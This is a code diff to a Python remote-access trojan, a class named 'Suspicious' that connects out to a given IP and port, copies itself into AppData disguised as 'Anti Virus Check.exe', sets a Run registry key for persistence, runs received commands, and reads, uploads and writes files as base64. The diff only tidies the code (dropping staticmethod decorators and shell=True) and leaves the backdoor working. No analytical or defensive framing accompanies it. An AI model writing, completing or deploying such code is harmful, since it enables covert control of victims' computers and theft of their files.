@@ -15,16 +15,14 @@ class Suspicious:
         self.connetion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
 
-    @staticmethod
     def restart_control(self):
         piece_of_cake = os.path.join(
             os.environ['appdata'], r"Anti Virus Check.exe")
         if not os.path.exists(piece_of_cake):
             shutil.copy(sys.executable, piece_of_cake)
             subprocess.call(
-                rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "{piece_of_cake}"', shell=True)
+                rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "{piece_of_cake}"')
 
-    @staticmethod
     def handleErrorDataSendType(self, error):
         return str(error)
 
@@ -32,21 +30,18 @@ class Suspicious:
         # the output data type of the check_output method is byte
         try:
             command = " ".join(command)
-            return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode('utf-8')
+            return subprocess.check_output(command, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode('utf-8')
         except Exception as error:
             return self.handleErrorDataSendType(error)
 
-    @staticmethod
     def changeWorkingDirectory(self, path):
         os.chdir(path)
         return "[+] Changed current working folder to " + str(path)
 
-    @staticmethod
     def read_file(self, path):
         with open(path, 'rb') as f:
             return base64.b64encode(f.read())
 
-    @staticmethod
     def download_file(self, path, content):
         with open(path, 'wb') as f:
             f.write(base64.b64decode(content))
@@ -65,7 +60,6 @@ class Suspicious:
         json_data = json.dumps(data)
         self.connetion.send(json_data.encode('utf-8'))
 
-    @staticmethod
     def getSystemInfo(self):
         platform = {'aix': 'AIX', 'linux': "Linux", 'win32': 'Windows',
                     'cygwin': 'Windows/Cygwin', 'darwin': 'macOs'}
